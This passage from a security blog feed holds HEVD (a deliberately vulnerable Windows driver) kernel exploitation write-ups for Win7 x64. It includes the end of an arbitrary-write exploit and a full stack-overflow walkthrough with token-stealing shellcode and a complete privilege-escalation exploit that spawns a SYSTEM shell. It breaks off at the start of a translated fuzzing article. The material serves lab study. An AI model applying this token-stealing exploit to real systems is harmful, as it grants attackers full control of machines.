class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] VirtualAlloc failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    ULONG64* ptrShellcode = (ULONG64 *)&amp;addr;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] shecllode addr: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; addr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG64 chBuffer[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;;    chBuffer[<span class="hljs-number">0</span>] = (ULONG64)ptrShellcode;    chBuffer[<span class="hljs-number">1</span>] = (ULONG64)(HalDispatchTable + <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    DeviceIoControl(dev, <span class="hljs-number">0x22200B</span>, chBuffer, <span class="hljs-number">0x10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 00000000`000e0000</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment">    */</span>    CloseHandle(dev);    TriggerShellcode();    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/</a><br><a href="https://h0mbre.github.io/HEVD_AbitraryWrite_64bit">https://h0mbre.github.io/HEVD_AbitraryWrite_64bit</a><br><a href="https://www.anquanke.com/post/id/246289">https://www.anquanke.com/post/id/246289</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 stack overflow</title>
    <link href="/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/"/>
    <url>/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/</url>
    
    <content type="html"><![CDATA[<p>尝试学点新东西，应该算是很久没学了</p><pre><code class="hljs nsis">环境：虚拟机：<span class="hljs-literal">Win7</span> SP1 x64物理机：<span class="hljs-literal">Win10</span>debugger：windbg previewcompiler：vs2022</code></pre><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="VirtualKD-Redux"><a href="#VirtualKD-Redux" class="headerlink" title="VirtualKD-Redux"></a>VirtualKD-Redux</h3><p>看了很多博客，以及尝试搭建环境，最后发现还是别人写的轮子好用</p><p><a href="https://github.com/4d61726b/VirtualKD-Redux">VirtualKD-Redux</a></p><p>下载之后，解压，把<code>target64</code>文件夹放到虚拟机中，然后在虚拟机运行<code>vminstall.exe</code>即可</p><p>这个安装所做的事情，如<a href="https://blog.csdn.net/lixiangminghate/article/details/78659646">VirtualKD加速windbg双机调试速度</a>所说</p><p>第一件事情就是添加了一个<code>VirtualKD</code>的启动项</p><p>但是第二件事情，我并没找到存在<code>DDKLaunchMonitor.exe</code>文件以及对注册表修改的行为（这个注册表的行为，可以看到老版本的这个轮子，存在<code>kdpatch.reg</code>），但是我发现<code>kdbazis.dll</code>该文件被放到了<code>C:\Windows\System32</code>目录下，查阅了一些资料，提到<code>kdbazis.dll</code>是由<code>kdvm.dll</code>重命名而来（重命名是因为避免<code>win8</code>以上的操作系统文件名称冲突），其作用就是用于通信，根据运行在主机运行<code>vmmon64.exe</code>的窗口的<code>log</code>可以看到<code>VirtualKD-Redux patcher DLL successfully loaded. Patching the GuestRPC mechanism...</code>，那应该就是对于<code>GuestRPC</code>的机制进行<code>patch</code>，从而便于通信，并且该模式下，可以加载未签名的驱动，即将要加载的<code>HEVD.sys</code></p><p>主机在<code>win7</code>启动时，运行<code>vmmon64</code>进行监控，并启动<code>Run debugger</code></p><h3 id="OSRLOADER"><a href="#OSRLOADER" class="headerlink" title="OSRLOADER"></a>OSRLOADER</h3><p>加载<code>HEVD.sys</code>驱动</p><h3 id="Windbg-Preview"><a href="#Windbg-Preview" class="headerlink" title="Windbg Preview"></a>Windbg Preview</h3><p>需要设置一下<code>_NT_SYMBOL_PATH</code>，为<code>srv*H:\WinSymbols*https://msdl.microsoft.com/download/symbols;</code></p><p>在调试时，可以加载<code>HEVD.pdb</code>便于下断点，以及需要在<code>OSRLOADER</code>中<code>start service</code>才可以看到<code>HEVD</code>驱动</p><p>利用<code>lm m h*</code>指令就可以看到<code>HEVD</code>是否加载了</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>可以通过<code>lm m HEVD</code>看<code>HEVD</code>模块的基础信息，通过<code>!drvobj HEVD 2</code>查看该驱动的详细的信息</p><p>在<code>IrpDeviceIoCtlHandler()</code>接口可以看到各种<code>ioctlhandler</code>，其中栈溢出为<code>0x222003</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x222003</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = BufferOverflowStackIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>漏洞点十分简单，就是裸溢出</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">BufferOverflowStackIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 Options; <span class="hljs-comment">// rdx</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>i64;  Options = IrpSp-&gt;Parameters.Create.Options;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerBufferOverflowStack(Parameters, Options);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerBufferOverflowStack</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *UserBuffer, <span class="hljs-keyword">unsigned</span> __int64 Size)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">2048</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-818h] BYREF</span>  <span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v5));  ProbeForRead(UserBuffer, <span class="hljs-number">0x800</span>ui64, <span class="hljs-number">1u</span>);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v5);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="hljs-number">0x800</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);  memmove(v5, UserBuffer, Size);                <span class="hljs-comment">// stack overflow</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>因此输入字符串覆盖到<code>ret</code>即可触发漏洞</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>首先打开这个设备，然后于这个设备进行交互，通过调试，可以看到最后<code>ret</code>的时候，<code>rip</code>跳转到了<code>0x4141414141414141</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>现在要做的就是提权之后再打开一个<code>cmd</code></p><p>目前第一个栈溢出的实验，是没开<code>SMEP</code>，因此可以直接跳转到用户态的空间执行指令，就可以直接<code>VirtualAlloc</code>一个可读可写可执行的页，从而直接执行提权的指令</p><p>这里是直接参考<a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">[Kernel Exploitation] 2: Payloads</a>的方法，窃取的进程级令牌</p><p>每个<code>windows</code>进程都有一个<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">EPROCESS</a>结构体（<code>PEB</code>存在于用户空间），而这个<code>EPROCESS</code>结构包含一个<code>Token</code>字段，这个字段告诉系统该进程拥有什么权限，因此如果能找到特权进程的<code>Token</code>，将其偷过来，然后放到当前进程的<code>Token</code>上，就可以提权了</p><p>为了找到<code>EPROCESS</code>就需要依赖对下述结构体的了解</p><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>_KPCR</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kpcr.htm">KPCR</a>代表<code>Kernel Processor Control Region</code>，内核为每一个逻辑处理器都维护一个<code>KPCR</code></p><p>可以看到<code>_KPRCB</code>结构体在<code>_KPCR</code>的偏移为<code>0x180</code>的地方</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPCR</span> Prcbntdll!<span class="hljs-variable">_KPCR</span>   +<span class="hljs-number">0</span>x180 Prcb : <span class="hljs-variable">_KPRCB</span></code></pre><p><strong>_KPRCB</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kprcb.htm">_KPRCB</a>代表<code>Kernel Processor Control Block</code>，为<code>KPCR</code>的最后一个字段，拥有内核在管理处理器和管理资源时需要随时访问的大部分内容</p><p>可以看到在偏移为<code>0x8</code>的地方可以拿到当前的线程，因此直接通过 <code>_KPCR+0x188</code> 就可以获取当前内核线程的结构体</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPRCB</span> CurrentThreadntdll!<span class="hljs-variable">_KPRCB</span>   +<span class="hljs-number">0</span>x008 CurrentThread : Ptr64 <span class="hljs-variable">_KTHREAD</span></code></pre><p><strong>_KTHREAD</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kthread/index.htm">KTHREAD</a>是内核内部的线程结构</p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">KPROCESS</a>位于<code>_KTHREAD.ApcState.Process</code>之中</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KTHREAD</span> ApcStatentdll!<span class="hljs-variable">_KTHREAD</span>   +<span class="hljs-number">0</span>x050 ApcState : <span class="hljs-variable">_KAPC_STATE</span></code></pre><p><strong>_KAPC_STATE</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kprocessor_state.htm">_KAPC_STATE</a>是一个较为简单的处理器状态集合</p><p>因此通过<code>_KTHREAD+0x70</code>可以获得<code>_KPROCESS</code></p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KAPC_STATE</span> Processntdll!<span class="hljs-variable">_KAPC_STATE</span>   +<span class="hljs-number">0</span>x020 Process : Ptr64 <span class="hljs-variable">_KPROCESS</span></code></pre><p><strong>_EPROCESS</strong></p><p>根据<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">_EPROCESS</a>和<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">_KPROCESS</a>可知</p><p><code>_EPROCESS</code>的第一项是<code>_KPROCESS</code>，因此找到<code>_KPROCESS</code>的地址，就相当于找到了<code>_EPROCESS</code>的地址，相当于<code>_EPROCESS</code>就是一个大结构体，其中的第一域就是<code>_KPROCESS</code>（P.S. <code>_KTHREAD</code>和<code>_ETHREAD</code>也是类似的）</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>: kd&gt; dt _EPROCESSntdll!_EPROCESS   +<span class="hljs-number">0x000</span> Pcb              : _KPROCESS   +<span class="hljs-number">0x160</span> ProcessLock      : _EX_PUSH_LOCK   +<span class="hljs-number">0x168</span> CreateTime       : _LARGE_INTEGER   +<span class="hljs-number">0x170</span> ExitTime         : _LARGE_INTEGER   +<span class="hljs-number">0x178</span> RundownProtect   : _EX_RUNDOWN_REF   +<span class="hljs-number">0x180</span> UniqueProcessId  : Ptr64 Void   +<span class="hljs-number">0x188</span> ActiveProcessLinks : _LIST_ENTRY   ...   +<span class="hljs-number">0x208</span> Token            : _EX_FAST_REF   ...</code></pre><p>因此需要覆盖的<code>Token</code>就是<code>0x208</code>偏移的域，而可以通过遍历<code>ActiveProcessLinks</code>获取<code>active</code>的进程，且已知系统进程的<code>PID</code>为<code>4</code>，因此就可以遍历<code>0x188</code>的进程链，找到<code>PID == 4</code>的进程，然后取出系统进程的<code>Token</code>，覆盖到当前进程的<code>Token</code>上</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>因此<code>x64</code>的<code>shellocde</code>如下</p><pre><code class="hljs assembly">xor rax, rax                        ; Set ZEROmov rax, [gs:rax + 188h]            ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at GS : [0x188]           mov rax, [rax + 70h]                ; Get nt!_KTHREAD.ApcState.Process     mov rcx, rax                        ; Copy current process _EPROCESS structure  mov r11, rcx                        ; Store Token.RefCntand r11, 7mov rdx, 4h                         ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4           SearchSystemPID:mov rax, [rax + 188h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub rax, 188hcmp [rax + 180h], rdx               ; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPIDmov rdx, [rax + 208h]               ; Get SYSTEM process nt!_EPROCESS.Tokenand rdx, 0fffffffffffffff0hor rdx, r11mov [rcx + 208h], rdx</code></pre><p>备份一下<code>x86</code>的</p><pre><code class="hljs assembly">pushad                              ; Save registers state; Start of Token Stealing Stubxor eax, eax                        ; Set ZEROmov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at FS : [0x124]mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Processmov ecx, eax                        ; Copy current process _EPROCESS structuremov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4SearchSystemPID:mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub eax, 0B8hcmp[eax + 0B4h], edx                ; Get nt!_EPROCESS.UniqueProcessIdjne SearchSystemPIDmov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Tokenmov[ecx + 0F8h], edx                ; Replace target process nt!_EPROCESS.Token                                    ; with SYSTEM process nt!_EPROCESS.Token</code></pre><h3 id="exp-cpp"><a href="#exp-cpp" class="headerlink" title="exp.cpp"></a>exp.cpp</h3><p>最终<code>exp</code>如下，这里的<code>shellcode</code>我是通过<code>nasm</code>进行编译的，然后再通过<code>hexdump -e &#39;16/1 &quot;%02x&quot; &quot; | &quot;&#39; -e &#39;16/1 &quot;%_p&quot; &quot;\n&quot;&#39; ./1.o</code> 变成可见字符的<code>16</code>进制，再转换的（没找到啥比较优雅的方式</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    <span class="hljs-comment">/* nasm -f elf64 ./1.s </span><span class="hljs-comment">    xor rax, rax                    ; Set ZERO</span><span class="hljs-comment">    mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread</span><span class="hljs-comment">                                    ; _KTHREAD is located at GS : [0x188]</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rax, [rax + 70h]            ; Get nt!_KTHREAD.ApcState.Process</span><span class="hljs-comment">    mov rcx, rax                    ; Copy current process _EPROCESS structure</span><span class="hljs-comment">    mov r11, rcx                    ; Store Token.RefCnt</span><span class="hljs-comment">    and r11, 7</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4</span><span class="hljs-comment"></span><span class="hljs-comment">    SearchSystemPID:</span><span class="hljs-comment">        mov rax, [rax + 188h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><span class="hljs-comment">        sub rax, 188h</span><span class="hljs-comment">        cmp [rax + 180h], rdx            ; Get nt!_EPROCESS.UniqueProcessId</span><span class="hljs-comment">        jne SearchSystemPID</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, [rax + 208h]           ; Get SYSTEM process nt!_EPROCESS.Token</span><span class="hljs-comment">    and rdx, 0fffffffffffffff0h</span><span class="hljs-comment">    or rdx, r11</span><span class="hljs-comment">    mov [rcx + 208h], rdx</span><span class="hljs-comment">    */</span>         CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\x48\x83\xc4\x28&quot;</span><span class="hljs-comment">// add rsp, 0x28</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret</span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAlloc failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-comment">//memset(chBuffer + chBufferLen, 0x41, 0x8);</span>    *(INT64*)(chBuffer + chBufferLen) = (INT64)addr;    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>需要注意的是编写<code>exp</code>，最后需要能让<code>ioctl</code>的<code>handler</code>不崩溃的返回，才可以再起<code>cmd</code>，得到一个提权之后的进程，因此要恢复<code>ret</code>到<code>BufferOverflowStackIoctlHandler</code>之后的<code>add rsp, 0x28; ret</code>指令</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://bbs.pediy.com/thread-270159.htm">https://bbs.pediy.com/thread-270159.htm</a><br><a href="https://h0mbre.github.io/HEVD_Stackoverflow_64bit/">https://h0mbre.github.io/HEVD_Stackoverflow_64bit/</a><br><a href="https://www.anquanke.com/post/id/245528">https://www.anquanke.com/post/id/245528</a><br><a href="https://50u1w4y.github.io/site/HEVD/homePage/">https://50u1w4y.github.io/site/HEVD/homePage/</a><br><a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">https://www.abatchy.com/2018/01/kernel-exploitation-2</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing Like A Caveman2: Improving Performance 译</title>
    <link href="/2022/06/10/fuzzing%20like%20a%20caveman2:%20improving%20performance/"/>
    <url>/2022/06/10/fuzzing%20like%20a%20caveman2:%20improving%20performance/</url>
    
    <content type="html"><![CDATA[<p>原文为 <a href="https://h0mbre.github.io/Fuzzing-Like-a-Caveman-2">Fuzzing Like A Caveman 2: Improving Performance</a>，本文章仅为个人理解的翻译和备份</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>在<code>Fuzzing like a Caveman</code>一节中（讲述了编写<code>fuzzer</code>），我们将关注提升我们之前<code>fuzzer</code>的性能，这意味着这将不会有任何大规模的改变，我们仅关注提升我们之前那篇博客做的东西，这意味着在这篇博文结束时我们最终还是会带着一个非常基本的<code>fuzzer</code>（仅让它变得更快！！），希望在不同目标上能发现更多的<code>bugs</code>，在这篇文章中，我们不会真正修改多线程或多进程，我们会将其保存到后续的<code>fuzzing</code>文章中</p><p>我觉得我需要在这里加一个<strong>免责声明</strong>，我远不是一个专业的开发者，在这一点上，我只是没有足够的编程经验像一个更有经验的程序员那样来识别提高性能的机会，我将使用我粗略的技术和有限的编程知识来改进我们之前的<code>fuzzer</code>，嗯就是这样，这个生成的代码将不漂亮，不完美，但是它会比我上一篇的文章做的<code>fuzzer</code>更好，这需要提到，所有的测试都是在<code>VMWare Workstation</code>中的<code>1 CPU 1 Core</code>的<code>x86 Kali</code>虚拟机上</p><p>让我们花点时间在这篇博客中定义<code>better</code>，我这里所说的<code>better</code>是我们可以在n次<code>fuzzing</code>迭代中会更快迭代，就是这样，我们将花点时间完成重写<code>fuzzer</code>、用一个更酷的语言、选择一个更稳固的目标并在以后用更先进的模糊测试技术</p><p><strong>很明显，如果你还没阅读上一篇文章，你将会跟不上！</strong></p><h2 id="Analyzing-Our-Fuzzer"><a href="#Analyzing-Our-Fuzzer" class="headerlink" title="Analyzing Our Fuzzer"></a>Analyzing Our Fuzzer</h2><p>很明显，我们最后的<code>fuzzer</code>是起作用的！我们在我们的目标文件中发现了一些<code>bugs</code>，但是我们知道当我们完成<code>fuzzer</code>时，我们还遗漏了一些优化，让我们再看看上一篇文章中的<code>fuzzer</code>（为了测试做了一些小的改动）。</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> random<span class="hljs-keyword">from</span> pexpect <span class="hljs-keyword">import</span> run<span class="hljs-keyword">from</span> pipes <span class="hljs-keyword">import</span> quote<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># 